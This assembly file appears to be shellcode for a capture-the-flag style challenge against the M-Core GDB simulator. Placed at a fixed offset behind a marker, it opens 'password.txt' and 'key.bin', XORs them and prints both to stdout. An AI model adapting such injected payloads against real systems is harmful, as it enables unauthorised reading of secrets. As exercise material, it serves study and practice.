/*
 * Use trap 1.
 * See gdb/sim/mcore/interp.c:handle_trap1(),sim_resume()(case 0x9:)
 * See gdb/sim/mcore/interp.c:util(),process_stub()
 */

#define SYS_read  3
#define SYS_write 4
#define SYS_open  5
#define SYS_close 6

	.org	0x1c10 - 8 - 256 - 24

	.section .text

	.globl	_start
	.type	_start, @function
_start:
	.long	0x61626364
	.long	0
	.long	0
	.long	0

	.long	_code

_addr:
_fname_addr:
	.long	_fname
_kname_addr:
	.long	_kname
_buffer_addr:
	.long	_buffer
_kbuffer_addr:
	.long	_kbuffer

_code:
	subi	r0, 24			/* SP -> _start */
	addi	r0, (_addr - _start)	/* SP -> _addr */

	/*
	 * SYSCALL NO: R1
	 * ARG1-3: R2-R4
	 * RETVAL: R2
	 * ERRCODE: -
	 */

__open:
	ld	r2, (r0, _fname_addr - _addr)
	movi	r3, 0
	movi	r1, SYS_open
	trap	1

__read:
	ld	r3, (r0, _buffer_addr - _addr)
	movi	r4, 16
	movi	r1, SYS_read
	trap	1

_save_size:
	mov	r5, r2

__kopen:
	ld	r2, (r0, _kname_addr - _addr)
	movi	r3, 0
	movi	r1, SYS_open
	trap	1

__kread:
	ld	r3, (r0, _kbuffer_addr - _addr)
	mov	r4, r5
	movi	r1, SYS_read
	trap	1

_exchange:
	ld	r1, (r0, _buffer_addr - _addr)
	ld	r2, (r0, _kbuffer_addr - _addr)
	mov	r6, r1
	addu	r6, r5
1:	ldb	r3, (r1, 0)
	ldb	r4, (r2, 0)
	xor	r3, r4
	stb	r3, (r1, 0)
	addi	r1, 1
	addi	r2, 1
	cmpne	r1, r6
	bt	1b

__write:
	movi	r2, 1
	ld	r3, (r0, _buffer_addr - _addr)
	mov	r4, r5
	movi	r1, SYS_write
	trap	1

__kwrite:
	movi	r2, 1
	ld	r3, (r0, _kbuffer_addr - _addr)
	mov	r4, r5
	movi	r1, SYS_write
	trap	1

__exit:
	movi	r2, 0
	/* See interp.c:util() (case 0:) */
	.short	0x5000

_fname:	.string	"password.txt"
_kname:	.string	"key.bin"

	.align 2
_code_end:

_buffer:
	.space	16
_kbuffer:
	.space	16
